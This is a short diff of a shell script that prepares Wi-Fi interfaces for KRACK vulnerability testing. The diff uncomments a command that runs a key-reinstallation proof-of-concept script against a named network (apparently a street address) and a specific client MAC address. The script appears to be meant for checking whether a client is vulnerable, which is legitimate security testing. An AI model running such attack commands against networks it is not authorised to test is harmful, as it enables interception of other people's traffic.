@@ -42,14 +42,8 @@ fi
 
 # Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
 
-
-## TODO NOTE we should also make sure that this is reversed when the user is done... Perhaps make it an option
-
 # TODO Let user choose whether to reboot computer
 ## NOTE not implemented
-
-#### TODO NOTE: next sections not done
-
 #TODO RUN: systool -vm ath9k_htc
 
 
@@ -62,5 +56,5 @@ fi
 ## TODO To check: the nohwcript/.. param has been set.
 
 # TODO Look for key reinstallations in the 4-way handshake
-#./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
+./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
 
